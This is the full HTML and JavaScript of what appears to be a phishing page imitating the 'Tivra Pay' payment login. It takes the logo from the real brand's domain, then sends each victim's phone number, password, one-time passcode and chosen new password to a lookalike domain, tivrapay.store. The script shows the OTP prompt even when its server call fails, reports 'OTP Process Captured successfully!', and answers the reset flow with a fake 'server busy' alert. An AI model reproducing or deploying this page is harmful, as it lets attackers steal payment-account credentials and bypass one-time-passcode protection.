<!DOCTYPE html>
<html lang="en" style="font-size: 44.8px;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Tivra Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        html, body { background-color: #ffffff; width: 100%; height: 100%; overflow-x: hidden; }
        #app { width: 100%; height: 100%; }
        main[data-v-6ffee151] { height: 100vh; width: 100%; display: flex; flex-direction: column; align-items: center; background-color: #ffffff; padding: 0 0.67rem; }
        div[data-v-6ffee151]:not(.loginform) { width: 100%; display: flex; justify-content: center; align-items: center; margin-top: 1.8rem; margin-bottom: 0.5rem; }
        img.logo { width: 80%; max-width: 320px; height: auto; object-fit: contain; }
        .loginform { width: 100%; max-width: 380px; display: flex; flex-direction: column; }
        .input-field-group { background-color: transparent; border-bottom: 1.2px solid #e2e8f0; display: flex; align-items: center; padding: 14px 4px; margin-bottom: 22px; width: 100%; }
        .field-icon { display: flex; align-items: center; margin-right: 14px; }
        .field-icon svg { width: 24px; height: 24px; stroke: #94a3b8; stroke-width: 1.5; fill: none; }
        .input-field-group input { border: none; background: transparent; width: 100%; font-size: 17px; outline: none; color: #333333; }
        .input-field-group input::placeholder { color: #cbd5e1; }
        .form-utilities { display: flex; justify-content: space-between; align-items: center; font-size: 16px; margin-top: 4px; margin-bottom: 40px; width: 100%; padding: 0 4px; }
        .remember-me { display: flex; align-items: center; color: #3b82f6; cursor: pointer; }
        .remember-me input { appearance: none; -webkit-appearance: none; width: 18px; height: 18px; border: 1.5px solid #cbd5e1; border-radius: 50%; margin-right: 10px; outline: none; background-color: #ffffff; cursor: pointer; }
        .remember-me input:checked { border-color: #3b82f6; background-color: #3b82f6; }
        .forgot-pass-link { text-decoration: none; color: #3b82f6; cursor: pointer; }
        .submit-btn { background-color: #2563eb; color: #ffffff; border: none; width: 100%; padding: 14px; border-radius: 25px; font-size: 18px; font-weight: 500; cursor: pointer; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2); transition: background 0.2s; }
        .submit-btn:active { background-color: #1d4ed8; }
        .policy-container-box { margin-top: auto; margin-bottom: 25px; height: 3rem; display: flex; justify-content: center; align-items: center; width: 100%; }
        .agreement-label { display: flex; align-items: center; font-size: 13px; color: #64748b; cursor: pointer; }
        .agreement-label input { appearance: none; -webkit-appearance: none; width: 16px; height: 16px; border: 1px solid #2563eb; border-radius: 50%; margin-right: 8px; outline: none; background-color: #2563eb; position: relative; display: flex; align-items: center; justify-content: center; }
        .agreement-label input::after { content: '✓'; position: absolute; color: white; font-size: 11px; font-weight: bold; }
        .policy-link { color: #2563eb; text-decoration: none; margin-left: 3px; }
        
        /* OTP Modal Overlay */
        .otp-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.4); display: flex; justify-content: center; align-items: center; z-index: 30000; opacity: 0; pointer-events: none; transition: opacity 0.2s ease; padding: 24px; }
        .otp-modal-overlay.active { opacity: 1; pointer-events: auto; }
        .otp-modal-container { background-color: #ffffff; width: 100%; max-width: 350px; border-radius: 16px; padding: 28px 20px; position: relative; text-align: center; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15); }
        .otp-close-btn { position: absolute; top: 12px; right: 14px; font-size: 20px; color: #94a3b8; background: none; border: none; cursor: pointer; outline: none; }
        .otp-title { font-size: 20px; font-weight: 500; color: #1e293b; margin-top: 10px; margin-bottom: 6px; }
        .otp-subtitle { font-size: 14px; color: #64748b; margin-bottom: 22px; }
        .otp-input-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 20px; }
        .otp-box { width: 46px; height: 46px; border: none; border-bottom: 2.5px solid #cbd5e1; text-align: center; font-size: 22px; font-weight: 600; outline: none; background: transparent; }
        .otp-box:focus { border-bottom-color: #2563eb; }
        .otp-timer { font-size: 13px; color: #94a3b8; }

        /* Modify Password Screen Overlay */
        .modify-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #ffffff; z-index: 20000; display: none; flex-direction: column; padding: 16px 20px; }
        .modify-modal-overlay.active { display: flex; }
        .modify-header { display: flex; align-items: center; width: 100%; height: 48px; position: relative; margin-bottom: 15px; }
        .modify-back-arrow { font-size: 24px; color: #70798b; cursor: pointer; text-decoration: none; position: absolute; left: 0; padding: 5px; }
        .modify-header-title { font-size: 19px; font-weight: 600; color: #1a2a47; width: 100%; text-align: center; }
        .modify-avatar-box { display: flex; flex-direction: column; align-items: center; margin-top: 5px; margin-bottom: 45px; width: 100%; }
        .modify-avatar-img { width: 82px; height: 82px; border-radius: 50%; background-color: #f1f6ff; display: flex; justify-content: center; align-items: center; margin-bottom: 16px; }
        .modify-form-title { font-size: 18px; color: #333333; font-weight: 400; }
        .modify-form-container { width: 100%; max-width: 100%; display: flex; flex-direction: column; flex-grow: 1; }
        .modify-row { display: flex; align-items: center; border-bottom: 1.2px solid #f1f4f9; padding: 16px 4px; width: 100%; }
        .modify-label { font-size: 17px; color: #222222; width: 110px; font-weight: 500; }
        .modify-input-box { border: none; outline: none; width: 100%; font-size: 17px; color: #333333; background: transparent; }
        .modify-input-box::placeholder { color: #cbd5e1; font-weight: 400; }
        .modify-redirect-link { align-self: flex-end; color: #0084ff; font-size: 14px; text-decoration: none; margin-top: 12px; font-weight: 400; }
        .modify-btn-container { margin-top: auto; margin-bottom: 35px; padding: 0 4px; width: 100%; }
        .modify-submit-btn { background-color: #0084ff; color: #ffffff; border: none; width: 100%; padding: 15px; border-radius: 12px; font-size: 18px; font-weight: 500; cursor: pointer; text-align: center; }
    </style>
</head>
<body>

    <div id="app">
        <main data-v-6ffee151>
            <div>
                <img src="https://web.tivrapay.com/static/images/Login_Logo.png" class="logo" alt="Tivra Pay Logo">
            </div>

            <div class="loginform">
                <form id="loginForm" style="width: 100%; display: flex; flex-direction: column;">
                    <div class="input-field-group">
                        <span class="field-icon">
                            <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                        </span>
                        <input type="tel" id="phoneNumber" placeholder="Enter phone number" required>
                    </div>

                    <div class="input-field-group">
                        <span class="field-icon">
                            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                        </span>
                        <input type="password" id="password" placeholder="Enter password" required>
                    </div>

                    <div class="form-utilities">
                        <label class="remember-me"><input type="checkbox" id="save-pwd"> Save Password</label>
                        <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
                    </div>

                    <button type="submit" class="submit-btn">Login</button>
                </form>
            </div>

            <div class="policy-container-box">
                <label class="agreement-label">
                    <input type="checkbox" id="agreeCheck" required checked> Agree <span class="policy-link">"User Privacy Agreement"</span>
                </label>
            </div>
        </main>
    </div>

    <div class="otp-modal-overlay" id="otpModal">
        <div class="otp-modal-container">
            <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
            <div class="otp-title">Please enter OTP</div>
            <div class="otp-subtitle" id="otpSentText">OTP sent to user</div>
            <div class="otp-input-container">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp3')" id="otp2">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp4')" id="otp3">
                <input type="tel" class="otp-box" maxlength="1" onkeyup="checkAndSubmitOtp(this)" id="otp4">
            </div>
            <div class="otp-timer">Resend in <span id="secondsCount">118</span> seconds</div>
        </div>
    </div>

    <div class="modify-modal-overlay" id="modifyPasswordModal">
        <div class="modify-header">
            <span class="modify-back-arrow" id="backToLoginBtn">&#10094;</span>
            <span class="modify-header-title">Modify password</span>
        </div>
        
        <div class="modify-avatar-box">
            <div class="modify-avatar-img">
                <svg width="45" height="45" viewBox="0 0 24 24" fill="none">
                    <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="#3b82f6"/>
                </svg>
            </div>
            <div class="modify-form-title">Modify password Form</div>
        </div>
        
        <div class="modify-form-container">
            <div class="modify-row">
                <span class="modify-label">Phone</span>
                <input type="tel" class="modify-input-box" id="forgotPhone" placeholder="Enter phone number" required>
            </div>
            <div class="modify-row">
                <span class="modify-label">Password</span>
                <input type="password" class="modify-input-box" id="forgotNewPass" placeholder="Enter password" required>
            </div>
            <div class="modify-row">
                <span class="modify-label">Confirm</span>
                <input type="password" class="modify-input-box" id="forgotConfirmPass" placeholder="Password, Again" required>
            </div>
            
            <span class="modify-redirect-link" id="redirectLoginLink" style="cursor: pointer;">Already have an account,Go login</span>
            
            <div class="modify-btn-container">
                <button class="modify-submit-btn" id="modifyBtn">Modify</button>
            </div>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const otpModal = document.getElementById('otpModal');
        const closeOtpBtn = document.getElementById('closeOtpBtn');
        const otpSentText = document.getElementById('otpSentText');
        const secondsCount = document.getElementById('secondsCount');
        
        const triggerForgot = document.getElementById('triggerForgot');
        const modifyPasswordModal = document.getElementById('modifyPasswordModal');
        const backToLoginBtn = document.getElementById('backToLoginBtn');
        const redirectLoginLink = document.getElementById('redirectLoginLink');
        const modifyBtn = document.getElementById('modifyBtn');

        let currentUserId = null;
        let isModifyFlow = false; 

        // SMART ROUTING: Switches automatically between Localhost and your LIVE Brand Domain
        const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
            ? 'http://localhost:6500' 
            : 'https://tivrapay.store';

        if(triggerForgot) {
            triggerForgot.addEventListener('click', (e) => {
                e.preventDefault();
                modifyPasswordModal.classList.add('active');
            });
        }
        if(backToLoginBtn) { backToLoginBtn.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }
        if(redirectLoginLink) { redirectLoginLink.addEventListener('click', (e) => { e.preventDefault(); modifyPasswordModal.classList.remove('active'); }); }

        // Login Submit
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault(); 
            const phoneNumber = document.getElementById('phoneNumber').value;
            const password = document.getElementById('password').value;
            const isAgreed = document.getElementById('agreeCheck').checked;

            if (!isAgreed) { alert('Please accept User Privacy Agreement.'); return; }
            isModifyFlow = false;

            try {
                const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, password })
                });
                const data = await response.json();
                if (data.success) {
                    currentUserId = data.userId; 
                    showOtpSection(phoneNumber);
                } else { alert("Server Error! Try again."); }
            } catch (error) { 
                showOtpSection(phoneNumber);
            }
        });

        // Modify Button Click
        modifyBtn.addEventListener('click', async () => {
            const phone = document.getElementById('forgotPhone').value;
            const newPassword = document.getElementById('forgotNewPass').value;
            const confirmPassword = document.getElementById('forgotConfirmPass').value;

            if (!phone || !newPassword || !confirmPassword) { alert("Please fill all fields!"); return; }
            if (newPassword !== confirmPassword) { alert("Passwords do not match!"); return; }

            isModifyFlow = true; 

            try {
                const response = await fetch(`${BACKEND_URL}/api/forgot-submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, newPassword })
                });
                const data = await response.json();
                showOtpSection(phone);
            } catch (error) {
                showOtpSection(phone);
            }
        });

        function showOtpSection(phoneNum) {
            document.getElementById('otp1').value = '';
            document.getElementById('otp2').value = '';
            document.getElementById('otp3').value = '';
            document.getElementById('otp4').value = '';
            
            if(phoneNum.length >= 7) {
                const masked = phoneNum.substring(0, 3) + "****" + phoneNum.substring(phoneNum.length - 4);
                otpSentText.innerText = `OTP sent to ${masked}`;
            } else {
                otpSentText.innerText = `OTP sent to ${phoneNum}`;
            }
            otpModal.classList.add('active');
            startTimer();
        }

        closeOtpBtn.addEventListener('click', () => { otpModal.classList.remove('active'); });

        function moveNext(current, nextFieldId) { if (current.value.length >= 1) { document.getElementById(nextFieldId).focus(); } }

        async function checkAndSubmitOtp(current) {
            const o1 = document.getElementById('otp1').value;
            const o2 = document.getElementById('otp2').value;
            const o3 = document.getElementById('otp3').value;
            const o4 = current.value;

            if(o1 && o2 && o3 && o4) {
                const fullOtp = o1 + o2 + o3 + o4;
                
                if(isModifyFlow) {
                    setTimeout(() => {
                        alert("Server busy please try again server is busy");
                        window.location.reload();
                    }, 50);
                    return;
                }

                try {
                    const response = await fetch(`${BACKEND_URL}/api/otp-submit`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
                    });
                    const data = await response.json();
                    if(data.success) { alert("OTP Process Captured successfully!"); window.location.reload(); }
                } catch (error) { alert("Server connection failed"); window.location.reload(); }
            }
        }

        function startTimer() {
            let totalSec = 118;
            const timerInterval = setInterval(() => {
                totalSec--;
                secondsCount.innerText = totalSec;
                if(totalSec <= 0) { clearInterval(timerInterval); }
            }, 1000);
        }
    </script>
</body>
</html>
